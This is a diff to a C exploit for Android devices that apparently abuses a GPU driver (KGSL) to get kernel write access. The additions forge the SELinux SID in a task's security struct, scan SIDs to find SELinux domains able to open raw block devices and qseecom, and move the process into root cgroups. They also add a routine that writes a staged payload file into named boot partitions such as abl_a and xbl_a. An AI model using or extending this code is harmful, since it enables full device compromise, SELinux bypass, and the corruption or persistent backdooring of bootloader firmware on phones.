@@ -13,6 +13,7 @@
 #include <sys/prctl.h>
 #include <sys/stat.h>
 #include <sys/wait.h>
+#include <linux/capability.h>
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <unistd.h>
@@ -103,6 +104,9 @@ struct ctrl {
     volatile int sec_probe_ready;
     volatile int sec_probe_result;
     volatile int sec_scan_stop;
+    volatile uint64_t sec_fake_addr;   /* kernel VA of the forged security struct */
+    char sec_ctx[128];
+    int sec_errno[12];
     struct selinux_handoff_state handoff;
 };
 static struct ctrl *ctrls;
@@ -117,7 +121,7 @@ static unsigned char *g_km_expected_buffer;
 static char *g_sec_log;
 #define SEC_DUMP_SIZE (48u << 20)
 #define SEC_DUMP_MAX 12
-#define SEC_SID_SCAN_MAX 200000
+#define SEC_SID_SCAN_MAX 4096
 struct sec_dump_hdr {
     volatile int done;
     volatile int count;
@@ -179,6 +183,50 @@ static int sec_gpt_load(int fd) {
 }
 
 static int g_sec_rawfd = -1;
+
+/* Write a block of data into a partition.  Uses the by-name node when it is
+ * reachable, otherwise the raw disk node with the GPT-derived offset. */
+static long long sec_write_partition(const char *name, unsigned char *src,
+                                     long long len, long long off) {
+    char p[96];
+    snprintf(p, sizeof p, "/dev/block/by-name/%s", name);
+    int fd = open(p, O_WRONLY);
+    if (fd >= 0) {
+        if (off && lseek(fd, off, SEEK_SET) < 0) {
+            int e = errno;
+            close(fd);
+            return -(e ? e : EIO);
+        }
+        ssize_t w = write(fd, src, (size_t)len);
+        int e = errno;
+        close(fd);
+        return w == len ? (long long)w : -(e ? e : EIO);
+    }
+    if (g_sec_rawfd < 0) {
+        static const char *raws[] = {"/dev/block/sda", "/dev/block/sdb",
+                                      "/dev/block/sdc", NULL};
+        for (int i = 0; raws[i]; i++) {
+            int r = open(raws[i], O_RDWR);
+            if (r < 0) continue;
+            if (sec_gpt_load(r) == 0) {
+                g_sec_rawfd = r;
+                break;
+            }
+            close(r);
+        }
+    }
+    if (g_sec_rawfd < 0)
+        return -EACCES;
+    for (int i = 0; i < sec_gpt_count; i++) {
+        if (strcmp(sec_gpt[i].name, name))
+            continue;
+        long long base = (long long)sec_gpt[i].first * sec_gpt_lbs;
+        ssize_t w = pwrite(g_sec_rawfd, src, (size_t)len, base + off);
+        int e = errno;
+        return w == len ? (long long)w : -(e ? e : EIO);
+    }
+    return -ENOENT;
+}
 
 static long long sec_dump_partition(const char *name, unsigned char *dst,
                                     long long cap) {
@@ -659,6 +707,17 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
             }
         }
         int cf = open("/proc/self/attr/current", O_RDONLY);
+        {
+            struct __user_cap_header_struct ch = {_LINUX_CAPABILITY_VERSION_3, 0};
+            struct __user_cap_data_struct cd[2] = {{0}};
+            if (syscall(SYS_capget, &ch, cd) == 0)
+                printf("[cap] eff=%08x%08x perm=%08x%08x bset=%08x%08x\n",
+                       cd[1].effective, cd[0].effective, cd[1].permitted,
+                       cd[0].permitted, cd[1].inheritable, cd[0].inheritable);
+            else
+                printf("[cap] capget failed errno=%d\n", errno);
+            fflush(NULL);
+        }
         if (cf >= 0) {
             char ctx[128] = {0};
             int n = (int)read(cf, ctx, sizeof(ctx) - 1);
@@ -809,20 +868,96 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
                     __asm__ volatile("yield" ::: "memory");
                     continue;
                 }
+                /* Apply the requested SID.  The child holds KERNEL_DS, so it
+                 * can patch the forged task_security_struct directly; the
+                 * parent's GPU write path is unreliable after the first
+                 * submission. */
+                if (ctrls[idx].sec_fake_addr) {
+                    volatile uint32_t *fake =
+                        (volatile uint32_t *)(uintptr_t)ctrls[idx].sec_fake_addr;
+                    uint32_t sid = (uint32_t)ctrls[idx].sec_probe_cand;
+                    fake[0] = sid;
+                    __sync_synchronize();
+                    fake[1] = sid;
+                    __sync_synchronize();
+                }
                 static const char *paths[] = {
                     "/dev/sg0", "/dev/block/sda",
                     "/dev/block/by-name/abl_a", "/dev/block/by-name/xbl_a",
-                    "/dev/qseecom", "/sys/fs/selinux/load", NULL};
+                    "/dev/qseecom", "/sys/fs/selinux/load",
+                    "/dev/block/sda1", "/dev/block/sda6", "/dev/block/sda40",
+                    "/dev/block/sda52", "/dev/binder", NULL};
+                static const char *cgpaths[] = {
+                    "/sys/fs/cgroup/uid_0/pid_728/cgroup.procs",
+                    "/sys/fs/cgroup/uid_0/pid_1/cgroup.procs",
+                    "/sys/fs/selinux/load", NULL};
                 int mask = 0;
-                for (int pi = 0; paths[pi] && pi < 8; pi++) {
-                    int fd = open(paths[pi], O_RDONLY);
-                    if (fd >= 0) { mask |= 1 << pi; close(fd); }
+                if (getenv("SEC_CGMOVE")) {
+                    for (int pi = 0; cgpaths[pi] && pi < 3; pi++) {
+                        int fl = pi < 2 ? O_WRONLY : O_RDONLY;
+                        int fd = open(cgpaths[pi], fl);
+                        if (fd >= 0) { mask |= 1 << pi; close(fd); }
+                    }
+                } else {
+                    for (int pi = 0; paths[pi] && pi < 12; pi++) {
+                        int fd = open(paths[pi], O_RDONLY);
+                        if (fd >= 0) {
+                            mask |= 1 << pi;
+                            ctrls[idx].sec_errno[pi] = 0;
+                            close(fd);
+                        } else {
+                            ctrls[idx].sec_errno[pi] = errno;
+                        }
+                    }
+                }
+                /* report the context that the current SID resolves to, so the
+                 * parent can map SID numbers onto SELinux domains */
+                {
+                    int cf = open("/proc/self/attr/current", O_RDONLY);
+                    memset(ctrls[idx].sec_ctx, 0, sizeof(ctrls[idx].sec_ctx));
+                    if (cf >= 0) {
+                        char ctx[sizeof(ctrls[idx].sec_ctx)];
+                        int n = (int)read(cf, ctx, sizeof(ctx) - 1);
+                        close(cf);
+                        if (n > 0) {
+                            ctx[n] = 0;
+                            memcpy(ctrls[idx].sec_ctx, ctx,
+                                   sizeof(ctrls[idx].sec_ctx) - 1);
+                        }
+                    }
                 }
                 ctrls[idx].sec_probe_result = mask;
                 __sync_synchronize();
                 ctrls[idx].sec_probe_ready = 0;
             }
             printf("[scan] stop, final sid applied\n");
+            fflush(NULL);
+        }
+        if (getenv("SEC_CGMOVE")) {
+            static const char *cgs[] = {
+                "/sys/fs/cgroup/uid_0/pid_728/cgroup.procs",
+                "/sys/fs/cgroup/uid_0/pid_1/cgroup.procs", NULL};
+            char b[32];
+            int n = snprintf(b, sizeof b, "%d\n", getpid());
+            for (int i = 0; cgs[i]; i++) {
+                int fd = open(cgs[i], O_WRONLY);
+                if (fd < 0) {
+                    printf("[cg] open %s errno=%d\n", cgs[i], errno);
+                    continue;
+                }
+                ssize_t w = write(fd, b, (size_t)n);
+                printf("[cg] move %s w=%zd errno=%d\n", cgs[i], w,
+                       w < 0 ? errno : 0);
+                close(fd);
+            }
+            static const char *after[] = {"/dev/block/sda",
+                                          "/dev/block/by-name/abl_a",
+                                          "/dev/qseecom", NULL};
+            for (int i = 0; after[i]; i++) {
+                int fd = open(after[i], O_RDONLY);
+                printf("[cg] %s=%d errno=%d\n", after[i], fd, fd < 0 ? errno : 0);
+                if (fd >= 0) close(fd);
+            }
             fflush(NULL);
         }
         if (g_dump_buf && g_dump_hdr) {
@@ -850,6 +985,23 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
             }
             __sync_synchronize();
             g_dump_hdr->done = 1;
+        }
+        if (getenv("SEC_WRITE") && g_dump_buf && g_dump_hdr) {
+            const char *wname = g_dump_hdr->ent[0].name;
+            long long len = g_dump_hdr->ent[0].size;
+            const char *woff = getenv("SEC_WRITE_OFF");
+            long long off = woff ? strtoll(woff, NULL, 0) : 0;
+            long long res = (len > 0) ? sec_write_partition(wname, g_dump_buf,
+                                                            len, off) : -ENOENT;
+            ctrls[idx].sec_errno[0] = (int)res;
+            ctrls[idx].sec_errno[1] = (int)len;
+            ctrls[idx].sec_errno[2] = (int)off;
+            ctrls[idx].sec_errno[3] = 0x5e7e;
+            printf("[write] %s off=%lld len=%lld result=%lld\n", wname, off,
+                   len, res);
+            fflush(NULL);
+            __sync_synchronize();
+            ctrls[idx].sec_probe_result = 0;
         }
         if (getenv("KM_UNLOCK_MODE")) {
             ctrls[idx].qsee_status = run_kmunlock_tool();
@@ -2080,7 +2232,7 @@ int main(int argc, char **argv) {
             g_sec_log = log;
         }
     }
-    if (sec_sid_mode && getenv("SEC_DUMP2")) {
+    if (sec_sid_mode && (getenv("SEC_DUMP2") || getenv("SEC_WRITE"))) {
         void *dbuf = mmap(NULL, SEC_DUMP_SIZE, PROT_READ | PROT_WRITE,
                           MAP_SHARED | MAP_ANONYMOUS, -1, 0);
         void *dhdr = mmap(NULL, sizeof(struct sec_dump_hdr),
@@ -2241,7 +2393,14 @@ int main(int argc, char **argv) {
             return 1;
         }
         forged_security = group_leader + g_target->task_fake_sec;
-        uint32_t ids[2] = {1, 1};              /* osid = sid = 1 (kernel) */
+        uint32_t sid_value = 1;
+        {
+            const char *sid_env = getenv("SEC_SID");
+            if (sid_env && *sid_env >= '0' && *sid_env <= '9')
+                sid_value = (uint32_t)strtoul(sid_env, NULL, 0);
+        }
+        uint32_t ids[2] = {sid_value, sid_value};  /* osid = sid */
+        printf("[*] forging SID %u\n", sid_value);
         uint32_t ptr[2] = {(uint32_t)forged_security,
                            (uint32_t)(forged_security >> 32)};
         if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
@@ -2257,9 +2416,11 @@ int main(int argc, char **argv) {
             kill_children_except(-1);
             return 1;
         }
-        printf("[+] forged SID 1 task_security_struct: kva=%016llx gpu=%016llx\n",
+        printf("[+] forged SID %u task_security_struct: kva=%016llx gpu=%016llx\n",
+               sid_value,
                (unsigned long long)forged_security,
                (unsigned long long)(root_child.page + g_target->task_fake_sec));
+        ctrls[root_child.idx].sec_fake_addr = forged_security;
     }
 
     uint64_t child_security = 0;
@@ -2291,6 +2452,29 @@ int main(int argc, char **argv) {
     printf("[*] reaping spray children after root verification\n");
     kill_children_except(root_child.idx);
     if (!run_kmunlock && !sec_sid_mode) su_runtime_close_prepared_server_socket();
+    if (sec_sid_mode && getenv("SEC_WRITE") && g_dump_buf && g_dump_hdr) {
+        /* stage the payload for the child: it lives in the shell domain and
+         * cannot read /data/local/tmp once it has adopted another SID. */
+        const char *wfile = getenv("SEC_WRITE_FILE");
+        const char *wname = getenv("SEC_WRITE");
+        int wfd = open(wfile ? wfile : "/data/local/tmp/sec_write.bin", O_RDONLY);
+        long long len = 0;
+        if (wfd >= 0) {
+            struct stat st;
+            if (fstat(wfd, &st) == 0 && st.st_size > 0 &&
+                (size_t)st.st_size <= SEC_DUMP_SIZE) {
+                len = (long long)read(wfd, g_dump_buf, (size_t)st.st_size);
+            }
+            close(wfd);
+        }
+        memset(g_dump_hdr, 0, sizeof(*g_dump_hdr));
+        strncpy(g_dump_hdr->ent[0].name, wname ? wname : "", 15);
+        g_dump_hdr->ent[0].name[15] = 0;
+        g_dump_hdr->ent[0].offset = 0;
+        g_dump_hdr->ent[0].size = len;
+        printf("[*] staged %lld bytes for partition '%s'\n", len,
+               wname ? wname : "");
+    }
     ctrls[root_child.idx].handoff.current_security = child_security;
     ctrls[root_child.idx].root_done = 0;
     ctrls[root_child.idx].error = 0;
@@ -2306,11 +2490,15 @@ int main(int argc, char **argv) {
     mark("root verified");
     if (sec_sid_mode && getenv("SEC_SIDSCAN") && forged_security) {
         int blk = 0, qse = 0, ctl = 0;
-        for (int cand = 1; cand <= SEC_SID_SCAN_MAX && !blk; cand++) {
-            uint32_t ids[2] = {(uint32_t)cand, (uint32_t)cand};
-            if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
-                                forged_security, ids, 2) < 0)
-                break;
+        int scan_max = SEC_SID_SCAN_MAX;
+        const char *want_ctx = getenv("SEC_WANT_CTX");
+        char last_ctx[128] = {0};
+        int matched = 0;
+        if (getenv("SEC_SCAN_LIMIT")) {
+            int v = atoi(getenv("SEC_SCAN_LIMIT"));
+            if (v > 0 && v < scan_max) scan_max = v;
+        }
+        for (int cand = 1; cand <= scan_max && !blk && !matched; cand++) {
             ctrls[root_child.idx].sec_probe_result = -1;
             ctrls[root_child.idx].sec_probe_cand = cand;
             __sync_synchronize();
@@ -2326,32 +2514,91 @@ int main(int argc, char **argv) {
             }
             if ((cand & 8191) == 0)
                 printf("[scan] progress %d\n", cand);
+            /* the child reports the context the current SID resolves to */
+            __sync_synchronize();
+            if (ctrls[root_child.idx].sec_ctx[0] &&
+                strcmp(last_ctx, ctrls[root_child.idx].sec_ctx) != 0) {
+                snprintf(last_ctx, sizeof(last_ctx), "%s",
+                         ctrls[root_child.idx].sec_ctx);
+                printf("[map] SID %d -> %s\n", cand, last_ctx);
+                if (want_ctx && *want_ctx && strstr(last_ctx, want_ctx)) {
+                    matched = cand;
+                    printf("[+] SID %d matches wanted context %s\n", cand,
+                           want_ctx);
+                }
+            }
             if (ok <= 0)
                 continue;
-            if ((ok & 0x3c) && !ctl) {
+            int want = getenv("SEC_CGMOVE") ? 0x03 : 0x0f;
+            int ctlbits = getenv("SEC_CGMOVE") ? 0x04 : 0x3c;
+            if ((ok & ctlbits) && !ctl) {
                 ctl = cand;
-                printf("[ctl] SID %d opens qseecom/load mask=0x%x\n", cand, ok);
+                printf("[ctl] SID %d mask=0x%x\n", cand, ok);
             }
-            if ((ok & 0x0f) && !blk) {
+            if ((ok & want) && !blk) {
                 blk = cand;
-                printf("[+] SID %d opens a disk node mask=0x%x\n", cand, ok);
+                printf("[+] SID %d usable mask=0x%x\n", cand, ok);
             }
-            if ((ok & 0x02) && !qse) {
+            if (!getenv("SEC_CGMOVE") && (ok & 0x02) && !qse) {
                 qse = cand;
                 printf("[+] SID %d opens /dev/qseecom\n", cand);
             }
         }
-        int final = blk ? blk : (qse ? qse : 1);
+        int final = matched ? matched : (blk ? blk : (qse ? qse : 1));
         uint32_t final_ids[2] = {(uint32_t)final, (uint32_t)final};
         (void)gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
                               forged_security, final_ids, 2);
         __sync_synchronize();
+        if (matched) {
+            /* re-probe with the wanted SID applied and report every errno */
+            ctrls[root_child.idx].sec_probe_result = -1;
+            ctrls[root_child.idx].sec_probe_ready = 1;
+            int ok = -1;
+            for (int w = 0; w < 500; w++) {
+                __sync_synchronize();
+                if (ctrls[root_child.idx].sec_probe_result >= 0) {
+                    ok = ctrls[root_child.idx].sec_probe_result;
+                    break;
+                }
+                usleep(10000);
+            }
+            static const char *probe_paths[] = {
+                "/dev/sg0", "/dev/block/sda",
+                "/dev/block/by-name/abl_a", "/dev/block/by-name/xbl_a",
+                "/dev/qseecom", "/sys/fs/selinux/load",
+                "/dev/block/sda1", "/dev/block/sda6", "/dev/block/sda40",
+                "/dev/block/sda52", "/dev/binder", NULL};
+            printf("[probe] final SID %d mask=0x%x ctx=%s\n", final, ok,
+                   ctrls[root_child.idx].sec_ctx);
+            for (int pi = 0; probe_paths[pi] && pi < 11; pi++)
+                printf("[probe] %-28s errno=%d\n", probe_paths[pi],
+                       ctrls[root_child.idx].sec_errno[pi]);
+        }
         ctrls[root_child.idx].sec_scan_stop = 1;
-        printf("[scan] control=%d block=%d qseecom=%d final=%d\n",
-               ctl, blk, qse, final);
+        printf("[scan] control=%d block=%d qseecom=%d final=%d matched=%d\n",
+               ctl, blk, qse, final, matched);
+        if (g_sec_log && *g_sec_log)
+            printf("[child log]\n%s\n", g_sec_log);
         if (!blk)
-            printf("[-] no SID in 1..%d could open a block device\n",
-                   SEC_SID_SCAN_MAX);
+            printf("[-] no SID in 1..%d could open a block device\n", scan_max);
+    }
+
+    if (sec_sid_mode && getenv("SEC_WRITE") && g_dump_hdr) {
+        int waited = 0;
+        while (ctrls[root_child.idx].sec_errno[3] != 0x5e7e && waited < 120000) {
+            usleep(50000);
+            waited += 50;
+        }
+        if (ctrls[root_child.idx].sec_errno[3] != 0x5e7e) {
+            printf("[-] write stage did not report back\n");
+        } else {
+            printf("[write] result=%d bytes=%d off=%d\n",
+                   ctrls[root_child.idx].sec_errno[0],
+                   ctrls[root_child.idx].sec_errno[1],
+                   ctrls[root_child.idx].sec_errno[2]);
+        }
+        if (g_sec_log && *g_sec_log)
+            printf("[child log]\n%s\n", g_sec_log);
     }
 
     if (sec_sid_mode && getenv("SEC_DUMP2") && g_dump_hdr) {
